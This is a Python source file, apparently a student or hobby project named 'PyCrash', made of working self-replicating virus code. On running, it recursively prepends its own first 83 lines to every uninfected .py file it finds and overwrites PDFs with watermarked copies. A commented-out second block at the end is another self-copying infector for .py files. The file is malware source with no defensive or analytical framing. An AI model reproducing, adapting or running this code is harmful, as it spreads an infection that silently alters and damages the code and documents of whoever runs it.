import os
from PyPDF2 import PdfFileReader, PdfFileWriter

NAME = "PyCrash"
def search_py(path):
	"""Searchs the given path recursively to find .py files"""
	files_to_infect = [] # the list of .py files to be infected
	filelist = os.listdir(path) # the list of files in the current path
	for fname in filelist:
		# os.path.join(path, fname)
		full_path = path+"/"+fname
		if os.path.isdir(full_path):
			files_to_infect.extend(search_py(full_path))
		elif fname[-3:] == ".py":
			infected = False
			for line in open(full_path):
				if "PyCrash" in line:
					infected = True
					break
			if not infected:
				files_to_infect.append(full_path)
	return files_to_infect

def infect_py_files(files_to_infect):
	"""Infect .py files by modifying them to include the viurus code with them"""
	virus = open(os.path.abspath(__file__)) # open the current file to read
	viruscode = "" # the code we want to add to infected python files
	for i, line in enumerate(virus):
		if i >= 0 and i < 83:
			viruscode += line
	virus.close()
	for fname in files_to_infect:
		with open(fname) as f:
			temp = f.read()

		with open(fname, "w") as f:
			f.write(viruscode+"\n"+temp)

def search_pdf(path):
	"""Searchs the given path recursively to find PDF files"""
	pdfs_to_infect = [] # the list of PDf files to be infected
	filelist = os.listdir(path) # the list of files in the current path
	for fname in filelist:
		full_path = path+"/"+fname
		if os.path.isdir(full_path):
			pdfs_to_infect.extend(search_pdf(full_path))
		elif fname[-4:] == ".pdf":
			pdfs_to_infect.append(full_path)
	return pdfs_to_infect

def add_watermark(filename):
	"""Add a watermark to the given PDF file"""
	watermark = PdfFileReader(open("watermark.pdf", 'rb')) # a file containing the watermark text to be applied
	watermark_content = watermark.getPage(0) # to read the content of the watermark

	pdf_reader = PdfFileReader(open(filename, 'rb')) # to read the content of the given file
	pdf_writer = PdfFileWriter() # to write the modified pdf file

	# now we add a water mark for every page on the file
	for i in range(pdf_reader.numPages):
		page = pdf_reader.getPage(i)
		page.mergePage(watermark_content) # adding a watermark to the page

		pdf_writer.addPage(page) # prepare watermarked pages to be written

	# after finishing watermarking each page, we overwrite the file
	with open(filename, "wb") as file:
		pdf_writer.write(file)

def virus_run():
	"""Runs the virus program"""
	current_path = os.path.dirname(__file__).replace("\\", "/")

	python_files = search_py(current_path)
	if len(python_files) > 0:
		infect_py_files(python_files)

	pdf_files = search_pdf(current_path)
	if len(pdf_files) > 0:
		for pdf in pdf_files:
			if "watermark" not in pdf:
				add_watermark(pdf)




virus_run()



# # VIRUS CODE START

# import sys
# import glob

# virus_code = []

# with open(sys.argv[0], 'r') as f:
#     lines = f.readlines()

# self_replicate = False
# for line in lines:
#     if line.strip() == '# VIRUS CODE START':
#         self_replicate = True
#     if self_replicate:
#         virus_code.append(line)
#     if line.strip() == '# VIRUS CODE END':
#         break
    
# python_files = glob.glob('*.py')

# for file in python_files:
#     with open(file, 'r') as f:
#         file_content = f.readlines()

#     infected = False
#     for line in file_content:
#         if line.strip() == '# VIRUS CODE START':
#             infected = True
#             break

#     if not infected:
#         final_content = []
#         final_content.extend(virus_code)
#         final_content.extend('\n')
#         final_content.extend(file_content)

#         with open(file, 'w') as f:
#             f.writelines(final_content)

# VIRUS CODE END